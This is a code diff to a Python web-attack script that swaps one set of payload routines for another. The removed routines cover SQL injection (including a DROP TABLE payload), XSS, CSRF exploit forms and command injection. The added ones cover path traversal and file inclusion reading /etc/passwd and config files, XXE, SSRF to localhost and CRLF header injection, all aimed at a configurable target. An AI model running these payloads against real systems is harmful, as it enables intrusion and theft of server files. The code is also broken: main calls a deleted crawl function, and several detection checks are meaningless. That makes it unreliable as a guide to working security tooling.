@@ -3,167 +3,133 @@ from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlencode
 
 # Global settings
-TARGET_URL = "http://example.com"  # Replace with the actual target or use a test environment
+TARGET_URL = "http://example.com"  # Replace with the actual target or test environment
 SESSION = requests.Session()
 
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
 }
 
-### 1. Web Application Mapping ###
-def map_application(url):
-    urls_to_visit = [url]
-    visited_urls = set()
+### Additional Attack Modules ###
 
-    print(f"Starting mapping of {url}")
-    
-    while urls_to_visit:
-        current_url = urls_to_visit.pop(0)
-        try:
-            response = SESSION.get(current_url, headers=HEADERS)
-            soup = BeautifulSoup(response.text, "html.parser")
-
-            for link in soup.find_all("a", href=True):
-                full_url = urljoin(url, link["href"])
-                if full_url not in visited_urls and full_url.startswith(url):
-                    visited_urls.add(full_url)
-                    urls_to_visit.append(full_url)
-        except requests.RequestException as e:
-            print(f"Error accessing {current_url}: {e}")
-
-    print(f"Mapping complete. Found {len(visited_urls)} URLs.")
-    return list(visited_urls)
-
-
-### 2. Bypassing Client-Side Controls ###
-def bypass_client_side_controls(url, payload):
-    try:
-        response = SESSION.get(url, headers=HEADERS)
-        soup = BeautifulSoup(response.text, "html.parser")
-
-        for form in soup.find_all("form"):
-            data = {}
-            action = form.get("action")
-            full_url = urljoin(url, action)
-
-            for input_tag in form.find_all("input"):
-                input_name = input_tag.get("name")
-                input_type = input_tag.get("type", "text")
-                input_value = input_tag.get("value", "")
-
-                if input_type == "hidden":
-                    data[input_name] = payload
-                else:
-                    data[input_name] = input_value
-
-            post_response = SESSION.post(full_url, headers=HEADERS, data=data)
-            print(f"Submitted form to {full_url} with manipulated hidden fields. Response code: {post_response.status_code}")
-    except Exception as e:
-        print(f"Error during client-side control bypass: {e}")
-
-
-### 3. Advanced SQL Injection Testing ###
-def test_sql_injection(url, param_name):
-    payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null --", "'; DROP TABLE users --"]
+### 1. Directory Traversal ###
+def test_directory_traversal(url, param_name):
+    payloads = ["../../../../etc/passwd", "../../windows/win.ini", "/etc/passwd"]
 
     for payload in payloads:
         params = {param_name: payload}
         full_url = f"{url}?{urlencode(params)}"
         response = SESSION.get(full_url, headers=HEADERS)
-        
-        if "syntax error" in response.text.lower() or "database error" in response.text.lower():
-            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
+
+        if "root:" in response.text or "[extensions]" in response.text:
+            print(f"Directory Traversal vulnerability found with payload: {payload}")
         else:
-            print(f"Tested payload: {payload} - No vulnerability detected")
+            print(f"Tested Directory Traversal payload: {payload} - No vulnerability detected")
 
 
-### 4. Advanced XSS Testing ###
-def test_xss(url, param_name):
-    xss_payloads = [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg/onload=alert(1)>",
-        "<body onload=alert('XSS')>",
-        "';alert(String.fromCharCode(88,83,83))//"
-    ]
-    for payload in xss_payloads:
+### 2. Local File Inclusion (LFI) ###
+def test_file_inclusion(url, param_name):
+    payloads = ["../../../../etc/passwd", "/var/www/html/config.php", "/proc/self/environ"]
+
+    for payload in payloads:
         params = {param_name: payload}
         full_url = f"{url}?{urlencode(params)}"
         response = SESSION.get(full_url, headers=HEADERS)
 
-        if payload in response.text:
-            print(f"XSS vulnerability found on {url} with payload: {payload}")
+        if "root:" in response.text or "<?php" in response.text:
+            print(f"File Inclusion vulnerability found with payload: {payload}")
         else:
-            print(f"Tested XSS payload: {payload} - No vulnerability detected")
+            print(f"Tested File Inclusion payload: {payload} - No vulnerability detected")
 
 
-### 5. CSRF Detection and Exploitation ###
-def test_csrf(url):
-    try:
-        response = SESSION.get(url, headers=HEADERS)
-        soup = BeautifulSoup(response.text, "html.parser")
-        forms = soup.find_all("form")
-        
-        for form in forms:
-            action = form.get("action")
-            full_url = urljoin(url, action)
+### 3. Insecure Deserialization ###
+def test_insecure_deserialization(url):
+    # Example payloads may vary depending on the application and serialized object types
+    payloads = ["O:8:\"Exploit\":0:{}", "O:8:\"Exploit\":1:{s:1:\"x\";i:1;}"]
 
-            # Check for CSRF tokens
-            csrf_token = any(input_tag for input_tag in form.find_all("input") if "csrf" in input_tag.get("name", "").lower())
+    for payload in payloads:
+        headers = HEADERS.copy()
+        headers["Content-Type"] = "application/x-java-serialized-object"
+        response = SESSION.post(url, headers=headers, data=payload)
 
-            if not csrf_token:
-                print(f"CSRF vulnerability detected on {full_url}")
-                
-                # Generate a simple CSRF exploit form
-                print(f"Generating CSRF exploit for {full_url}:\n")
-                print(f'<form method="POST" action="{full_url}">')
-                for input_tag in form.find_all("input"):
-                    if input_tag.get("type") == "hidden":
-                        print(f'<input type="hidden" name="{input_tag.get("name")}" value="{input_tag.get("value")}">')
-                print('<input type="submit" value="Exploit CSRF">')
-                print('</form>\n')
-            else:
-                print(f"CSRF token detected, likely protected: {full_url}")
-    except Exception as e:
-        print(f"Error during CSRF test: {e}")
-
-
-### 6. Command Injection Testing ###
-def test_command_injection(url, param_name):
-    command_injection_payloads = ["; ls", "&& ls", "| ls", "`ls`"]
-
-    for payload in command_injection_payloads:
-        params = {param_name: payload}
-        full_url = f"{url}?{urlencode(params)}"
-        response = SESSION.get(full_url, headers=HEADERS)
-
-        # Check for common responses that may indicate command execution
-        if "bin" in response.text or "root" in response.text or "etc" in response.text:
-            print(f"Potential Command Injection vulnerability found with payload: {payload}")
+        if "Exploit" in response.text or response.status_code == 500:
+            print(f"Insecure Deserialization vulnerability found with payload: {payload}")
         else:
-            print(f"Tested Command Injection payload: {payload} - No vulnerability detected")
+            print(f"Tested Deserialization payload: {payload} - No vulnerability detected")
 
 
-### 7. Session Management - Basic Session Fixation ###
-def test_session_fixation(url):
-    response = SESSION.get(url, headers=HEADERS)
-    
-    # Extract session cookie if it exists
-    session_cookie = SESSION.cookies.get("sessionid")  # Replace "sessionid" with actual session cookie name
+### 4. HTTP Parameter Pollution ###
+def test_http_parameter_pollution(url, param_name):
+    payload = {param_name: ["1", "2"]}
+    response = SESSION.get(url, params=payload, headers=HEADERS)
 
-    if session_cookie:
-        print(f"Original session ID: {session_cookie}")
-
-        # Fixate session by resetting the cookie to the original
-        SESSION.cookies.set("sessionid", session_cookie)
-        test_response = SESSION.get(url, headers=HEADERS)
-
-        if test_response.status_code == 200:
-            print("Session fixation vulnerability may be present.")
-        else:
-            print("Session fixation test completed without issues.")
+    if "2" in response.text or "1" in response.text:
+        print(f"HTTP Parameter Pollution detected at {url}")
     else:
-        print("No session cookie found. Unable to test session fixation.")
+        print(f"Tested for HTTP Parameter Pollution - No vulnerability detected")
+
+
+### 5. XML External Entity (XXE) Injection ###
+def test_xxe_injection(url):
+    xxe_payload = """<?xml version="1.0" ?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <foo>&xxe;</foo>"""
+    
+    headers = HEADERS.copy()
+    headers["Content-Type"] = "application/xml"
+
+    response = SESSION.post(url, headers=headers, data=xxe_payload)
+
+    if "root:" in response.text:
+        print("XXE vulnerability found!")
+    else:
+        print("Tested XXE payload - No vulnerability detected")
+
+
+### 6. DOM-based XSS ###
+def test_dom_xss(url):
+    payload = "#<script>alert('DOM XSS')</script>"
+    full_url = f"{url}{payload}"
+    response = SESSION.get(full_url, headers=HEADERS)
+
+    if "alert('DOM XSS')" in response.text:
+        print(f"DOM-based XSS vulnerability found at {full_url}")
+    else:
+        print("Tested DOM-based XSS payload - No vulnerability detected")
+
+
+### 7. Cross-Site WebSocket Hijacking ###
+def test_websocket_hijacking(url):
+    # Simulated payload (WebSocket hijacking would require more complex setup)
+    print(f"Attempting WebSocket hijack test at {url} - Placeholder (further setup needed)")
+
+
+### 8. Server-Side Request Forgery (SSRF) ###
+def test_ssrf(url, param_name):
+    payloads = ["http://127.0.0.1", "http://localhost:22"]
+
+    for payload in payloads:
+        params = {param_name: payload}
+        full_url = f"{url}?{urlencode(params)}"
+        response = SESSION.get(full_url, headers=HEADERS)
+
+        if "connection refused" in response.text or response.status_code == 200:
+            print(f"SSRF vulnerability found with payload: {payload}")
+        else:
+            print(f"Tested SSRF payload: {payload} - No vulnerability detected")
+
+
+### 9. HTTP Response Splitting ###
+def test_http_response_splitting(url, param_name):
+    payload = "%0D%0ASet-Cookie:%20session=malicious"
+    params = {param_name: payload}
+    full_url = f"{url}?{urlencode(params)}"
+    response = SESSION.get(full_url, headers=HEADERS)
+
+    if "Set-Cookie" in response.headers:
+        print(f"HTTP Response Splitting vulnerability found with payload: {payload}")
+    else:
+        print(f"Tested HTTP Response Splitting payload: {payload} - No vulnerability detected")
 
 
 ### Main Script ###
@@ -172,22 +138,29 @@ if __name__ == "__main__":
     urls = map_application(TARGET_URL)
     print("Mapped URLs:", urls)
 
-    # Step 2: Bypass Client-Side Controls
-    if urls:
-        bypass_client_side_controls(urls[0], payload="bypassed")
+    # Step 2: Directory Traversal
+    test_directory_traversal(TARGET_URL, "file")
 
-    # Step 3: Advanced SQL Injection
-    test_sql_injection(TARGET_URL, "id")
+    # Step 3: File Inclusion (LFI/RFI)
+    test_file_inclusion(TARGET_URL, "page")
 
-    # Step 4: Advanced XSS
-    test_xss(TARGET_URL, "search")
+    # Step 4: Insecure Deserialization
+    test_insecure_deserialization(TARGET_URL)
 
-    # Step 5: CSRF Detection and Exploitation
-    test_csrf(TARGET_URL)
+    # Step 5: HTTP Parameter Pollution
+    test_http_parameter_pollution(TARGET_URL, "id")
 
-    # Step 6: Command Injection
-    test_command_injection(TARGET_URL, "cmd")
+    # Step 6: XML External Entity (XXE) Injection
+    test_xxe_injection(TARGET_URL)
 
-    # Step 7: Session Management - Session Fixation
-    test_session_fixation(TARGET_URL)
+    # Step 7: DOM-based XSS
+    test_dom_xss(TARGET_URL)
 
+    # Step 8: Cross-Site WebSocket Hijacking
+    test_websocket_hijacking(TARGET_URL)
+
+    # Step 9: Server-Side Request Forgery (SSRF)
+    test_ssrf(TARGET_URL, "url")
+
+    # Step 10: HTTP Response Splitting
+    test_http_response_splitting(TARGET_URL, "redirect")
